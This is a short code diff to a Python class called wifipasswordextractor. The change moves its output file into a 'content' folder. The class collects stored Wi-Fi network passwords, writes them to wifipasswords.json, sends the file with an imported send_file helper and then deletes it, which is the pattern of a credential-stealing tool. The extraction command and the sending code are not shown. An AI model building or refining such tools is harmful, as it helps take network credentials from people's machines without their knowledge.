@@ -2,6 +2,11 @@ import subprocess
 import json
 from send_file import send_file
 from removefile import removefile
+import os
+
+FOLDER_NAME = "content"
+FILE_NAME = "wifipasswords.json"
+FILE_PATH = os.path.join(FOLDER_NAME, FILE_NAME)
 
 class wifipasswordextractor:
     def __init__(self):
@@ -30,12 +35,15 @@ class wifipasswordextractor:
             print("Error executing command")
 
     def write(self):
+        if not os.path.exists(FOLDER_NAME):
+            os.makedirs(FOLDER_NAME)
+        
         #Create file and write system info to this file
-        with open("wifipasswords.json", 'w') as f:
+        with open(FILE_PATH, 'w') as f:
             json.dump(self.wifi_networks, f)
 
     def send(self):
-        send_file("wifipasswords.json")
+        send_file(FILE_PATH)
 
     def remove(self):
-        removefile("wifipasswords.json")
+        removefile(FILE_PATH)
